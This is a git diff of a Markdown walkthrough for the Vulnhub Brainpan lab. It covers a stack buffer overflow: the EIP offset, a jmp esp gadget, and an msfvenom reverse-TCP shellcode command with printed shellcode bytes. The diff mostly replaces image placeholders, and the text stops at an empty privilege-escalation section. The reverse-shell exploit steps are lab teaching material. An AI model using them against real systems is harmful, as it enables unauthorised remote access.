@@ -106,8 +106,10 @@ We have a **Buffer Overflow!**
 
 Through a little trial and error, we find that we need to print **524** bytes to start overwriting **eip**.
 
-Typing `!mona modules` in immunity's command line, we see that all protections on **brainpan.exe** are turned off, so this is going to be pretty easy. (Install mona <a href="https://github.com/corelan/mona">here</a>.)
-<!-- thirteen -->
+Typing `!mona modules` in immunity's command line, we see that all protections on **brainpan.exe** are turned off, so this is going to be pretty easy. (Install mona <a href="https://github.com/corelan/mona">here</a>.)  
+
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/thirteen.png">
+
 
 Now that we control **eip**, what should we set it to? Where will our shellcode be placed?
 Please read: https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
@@ -117,7 +119,8 @@ Right after overwriting **eip** we start overwriting the next values on the stac
 * So we have to find a way to jump to **esp**.
 Searching in all modules in Immunity for the command `jmp esp` results in 
 
-<!-- fourteen -->
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/fourteen.png">
+
 
 We can only use the `jmp esp` located in **brainpan** itself, because it is the **only** module with **ASLR** disabled.
 This means that this particular instruction will always be at that particular address.
@@ -134,17 +137,21 @@ print padding
 ```
 Now do `python test.py > test` and restart the program giving as input `nc 192.168.2.11 9999 <test`
 
-<!-- fifteen -->
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/fifteen.png">
+
 
 We can see we are successful, the program executed our instruction perfectly and stopped right at the`\xcc` we provided , which is a way to halt execution. (This is how debuggers work and are able to stop execution of a program).
 
-Now let's create a **_real_** payload with **msfvenom**. Since the target is windows based we can create the appropriate shellcode with
+Now let's create a **_real_** payload with **msfvenom**. We can create the appropriate shellcode with
 `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.2.15 -e x86/shikata_ga_nai -b '\x00' -f python --smallest -v shellcode`.
+
+Although the target is Linux-based, it probably runs brainpan with **wine** and that is why we select windows in **msfvenom**, so we can execute **windows cmd** in wine at the remote host.
 
 The above command selects port **4444** as the listen port automatically and outputs the following shellcode in a format that is easy to implement in **python** and **clear** of **null bytes '\x00'**.
 
 
-```
+```python
+
 shellcode += b"\xdb\xd3\xd9\x74\x24\xf4\xbb\xad\x99\x66\x76"
 shellcode += b"\x5e\x31\xc9\xb1\x47\x83\xc6\x04\x31\x5e\x16"
 shellcode += b"\x03\x5e\x16\xe2\x58\x65\x8e\xf4\xa2\x96\x4f"
@@ -180,19 +187,22 @@ Create the final python script with the above shellcode. You can find it in this
 
 Let's test it locally first. Run brainpan with wine again and prepair like this.
 
-<!-- sixteen -->
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/sixteen.png">
+
 
 Now run the command at the bottom left aaaand we have a **shell** !
 
-<!-- seventeen -->
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/seventeen.png">
+
 
 Doing the same but for the brainpan box gives us a shell with the user **puck**
 
-<!-- 8teen -->
+<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/eighteen.png">
+
 
 ## Privilege escalation 
 ---
 
-
+As you have probably guessed the remote 
 
 
